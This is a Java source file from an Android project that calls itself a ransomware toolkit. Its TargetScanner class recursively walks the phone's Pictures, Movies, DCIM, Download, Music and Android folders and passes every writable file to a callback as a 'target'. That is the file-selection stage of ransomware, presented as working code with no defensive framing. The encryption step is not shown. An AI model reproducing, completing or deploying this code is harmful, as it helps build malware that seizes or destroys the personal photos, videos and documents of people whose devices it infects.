package com.asef18766.ransomtoolkit;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.NonNull;

import java.io.File;
import java.util.Objects;

public class TargetScanner {
    private static final String[] TARGET_FOLDERS = {
            "/Pictures",
            "/Movies",
            "/DCIM",
            "/Download",
            "/Music",
            "/Android"
    };
    private static final String BASE_FOLDER = Environment.getExternalStorageDirectory().toString();

    public interface OnTargetFounded {
        void targetFound(File fp);
    }
    private static OnTargetFounded action = null;

    public static void Scan(OnTargetFounded onTargetFounded){
        action = onTargetFounded;
        for (String i:TARGET_FOLDERS) {
            dfsWalkFiles(new File(BASE_FOLDER + "/" + i));
        }
    }
    private static void dfsWalkFiles(@NonNull File file) {
        //Log.i("scanner", String.format("start walking down:%s", file.getAbsolutePath()));
        for (File fp : Objects.requireNonNull(file.listFiles())) {
            if (fp.isDirectory())
                dfsWalkFiles(fp);
            else
            {
                if (fp.canWrite())
                {
                    Log.i("target", fp.getAbsolutePath());
                    action.targetFound(fp);
                }
                else
                    Log.i("not target", fp.getAbsolutePath());
            }
        }
    }
}
